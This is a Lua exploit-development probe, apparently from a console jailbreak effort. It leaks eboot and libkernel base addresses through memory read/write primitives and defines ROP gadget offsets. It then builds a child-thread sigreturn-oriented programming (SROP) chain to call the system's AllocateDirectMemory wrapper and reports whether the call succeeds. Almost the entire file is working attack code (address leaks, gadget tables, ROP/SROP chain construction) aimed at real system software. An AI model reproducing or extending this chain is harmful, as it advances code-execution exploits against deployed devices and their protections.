-- CRASH_CLASS: MODERATE
-- PROBE 552d: SROP to AllocateDirectMemory (wrapper function test)
--
-- 552b: child SROP → getpid (raw syscall) → WORKS
-- 552c: child SROP → MapDirectMemory (wrapper) → PROCESS KILLED
--
-- Question: is it SROP-to-wrapper that fails, or MapDirectMemory specifically?
-- This probe calls AllocateDirectMemory (a KNOWN WORKING wrapper at
-- libkernel+0x17EF0) via the same child SROP mechanism.
--
-- If this works → SROP-to-wrapper is fine, MapDirectMemory is the problem
-- If this crashes → calling ANY wrapper via SROP is broken

print("=== PROBE 552d: SROP → AllocateDirectMemory (wrapper test) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- eboot + libkernel
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
if lk_lo == 0 and lk_hi == 0 then
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then local c = b % 256; if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                break
            end
        end
    end
end
if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel"); return end
local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local function lkaddr(off) return lk_text + uint64(off) end
print(string.format("libkernel=0x%X%08X", lk_hi, lk_lo))

local G = {
    pop_rax = 0x992, pop_rdi = 0xC9DFE, pop_rsi = 0xD77D,
    mov_m = 0x92C67, bare_ret = 0x42,
}

-- sc_addr
local MC = 0x40
local gc_ctx = memory.alloc(0x500)
pcall(function() return mk(421)(uint64(gc_ctx)) end)
local rip_val = rq(N(gc_ctx) + MC + 0xA0)
if not rip_val then print("FAIL: getcontext"); return end
local rh, rl = get_hi_lo(rip_val)
if rh < 0 then rh = rh + 0x100000000 end
if rl < 0 then rl = rl + 0x100000000 end
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. fmt(sc_addr))

-- AllocateDirectMemory ABI (6 args):
--   rdi = off_t searchStart
--   rsi = off_t searchEnd
--   rdx = size_t len
--   rcx = size_t alignment
--   r8  = int memoryType
--   r9  = off_t *physAddrOut
local alloc_fn = lkaddr(0x17EF0)
print("AllocateDirectMemory=" .. fmt(alloc_fn))

-- First verify it works via fcall (known good path)
local phys_out_fcall = memory.alloc(8)
wq(N(phys_out_fcall), uint64(0))
local ok_f, rv_f = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out_fcall)))
end)
print("fcall test: ok=" .. tostring(ok_f) .. " rv=" .. (ok_f and tostring(N(rv_f)) or "crash"))
local fcall_phys = rq(N(phys_out_fcall))
print("fcall phys=" .. fmt(fcall_phys))

if not alive() then print("DIED in fcall test"); return end

-- ============================================================
-- Now call SAME function via child SROP
-- ============================================================
print("")
print("[TEST] Child SROP → AllocateDirectMemory")

local sc455 = mk(455)
local sc_mmap = mk(477)

local shared = memory.alloc(0x100)
z(shared, 0x100)
-- shared+0x00: AllocateDirectMemory return value (rax)
-- shared+0x10: done flag
-- shared+0x18: sysarch marker

local phys_out_srop = memory.alloc(8)
wq(N(phys_out_srop), uint64(0))

local cstack_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if not cstack_raw or N(cstack_raw) == 0 then print("stack mmap fail"); return end
local cstack = N(cstack_raw)

local tcb = memory.alloc(0x1000)
z(tcb, 0x1000)
wq(N(tcb), uint64(N(tcb)))
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(tcb)))

-- Inline epilogue at fn_rsp (proven in 552b)
local fn_rsp = cstack + 0x3008
local sp = fn_rsp
local function spwq(v) wq(sp, v); sp = sp + 8 end

-- AllocateDirectMemory returns via ret → pop first entry from RSP
spwq(eaddr(G.pop_rdi))           -- return addr
spwq(uint64(N(shared)))          -- rdi = &shared (store rax)
spwq(eaddr(G.mov_m))             -- [shared] = rax (return value)
spwq(eaddr(G.pop_rax))
spwq(uint64(0xDEAD))
spwq(eaddr(G.pop_rdi))
spwq(uint64(N(shared) + 0x10))
spwq(eaddr(G.mov_m))             -- done flag
spwq(eaddr(G.pop_rax))
spwq(uint64(431))
spwq(eaddr(G.pop_rdi))
spwq(uint64(0))
spwq(sc_addr)                    -- thr_exit

-- ucontext from parent
local uctx = memory.alloc(0x500)
local uctx_addr = N(uctx)
pcall(function() return mk(421)(uint64(uctx_addr)) end)

-- Patch for AllocateDirectMemory call
wq(uctx_addr + MC + 0xA0, alloc_fn)              -- mc_rip = AllocateDirectMemory
wq(uctx_addr + MC + 0xB8, uint64(fn_rsp))        -- mc_rsp
wq(uctx_addr + MC + 0x08, uint64(0))             -- mc_rdi = searchStart = 0
wq(uctx_addr + MC + 0x10, uint64("0x150000000")) -- mc_rsi = searchEnd
wq(uctx_addr + MC + 0x18, uint64(0x4000))        -- mc_rdx = len
wq(uctx_addr + MC + 0x50, uint64(0x4000))        -- mc_rcx = alignment
wq(uctx_addr + MC + 0x28, uint64(0))             -- mc_r8 = memoryType
wq(uctx_addr + MC + 0x30, uint64(N(phys_out_srop))) -- mc_r9 = &physAddrOut

-- Child ROP: sysarch → marker → sigreturn
local chain_off = 0x100000
local chain_base = cstack + chain_off + 8
local pos = chain_base
local function emit(v) wq(pos, v); pos = pos + 8 end

emit(eaddr(G.pop_rax)); emit(uint64(165))
emit(eaddr(G.pop_rdi)); emit(uint64(129))
emit(eaddr(G.pop_rsi)); emit(uint64(N(tcb_ptr)))
emit(sc_addr)

emit(eaddr(G.pop_rax)); emit(uint64(0xAAAA))
emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x18))
emit(eaddr(G.mov_m))

emit(eaddr(G.pop_rax)); emit(uint64(417))
emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr))
emit(sc_addr)

local chain_len = pos - chain_base
print("chain: " .. chain_len .. " bytes")

local child_stack_sz = chain_off + 0x10
local param = memory.alloc(0x40)
z(param, 0x40)
wq(N(param) + 0x00, eaddr(G.bare_ret))
wq(N(param) + 0x08, uint64(0))
wq(N(param) + 0x10, uint64(cstack))
wq(N(param) + 0x18, uint64(child_stack_sz))
local tid_p = memory.alloc(8)
wq(N(tid_p), uint64(0))
wq(N(param) + 0x30, uint64(N(tid_p)))

io.flush()
print("launching...")
io.flush()

local ok_t, ret_t = pcall(function()
    return sc455(uint64(N(param)), uint64(0x38))
end)
if not ok_t or (ret_t and N(ret_t) ~= 0) then
    print("thr_new FAIL"); return
end
print("thr_new OK")
io.flush()

local done = false
for timeout = 1, 1000000 do
    local flag = rq(N(shared) + 0x10)
    if flag and N(flag) == 0xDEAD then done = true; break end
    if timeout % 200000 == 0 and not alive() then break end
end

local m_sysarch = rq(N(shared) + 0x18)
local rv_srop = rq(N(shared))
local phys_srop = rq(N(phys_out_srop))

print("")
print("=== RESULTS ===")
print("alive=" .. tostring(alive()))
print("done=" .. tostring(done))
print("sysarch=" .. (m_sysarch and fmt(m_sysarch) or "nil") ..
    (m_sysarch and N(m_sysarch) == 0xAAAA and " OK" or " MISSING"))

if done then
    print("AllocateDirectMemory via SROP:")
    print("  rv=" .. (rv_srop and fmt(rv_srop) or "nil"))
    print("  phys=" .. (phys_srop and fmt(phys_srop) or "nil"))
    if rv_srop and N(rv_srop) == 0 then
        print("")
        print("*** SROP-TO-WRAPPER CONFIRMED ***")
        print("  fcall phys=" .. fmt(fcall_phys))
        print("  srop  phys=" .. fmt(phys_srop))
    end
else
    print("TIMEOUT or CRASH — wrapper via SROP may not work")
end

print("")
print("DONE")
